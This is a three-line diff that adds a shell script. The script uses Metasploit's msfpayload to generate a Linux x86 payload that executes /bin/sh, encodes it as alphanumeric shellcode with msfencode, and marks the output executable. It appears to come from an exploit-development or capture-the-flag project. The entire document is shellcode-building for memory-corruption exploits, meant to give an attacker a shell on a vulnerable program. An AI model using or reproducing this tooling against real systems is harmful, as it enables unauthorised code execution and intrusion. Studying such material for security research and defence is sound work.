@@ -1,0 +1,3 @@
+#!/bin/sh
+msfpayload linux/x86/exec CMD=/bin/sh X | msfencode BufferRegister=ECX -i sc.bin -e x86/alpha_mixed -b C
+chmod +x sc_encoded.bin
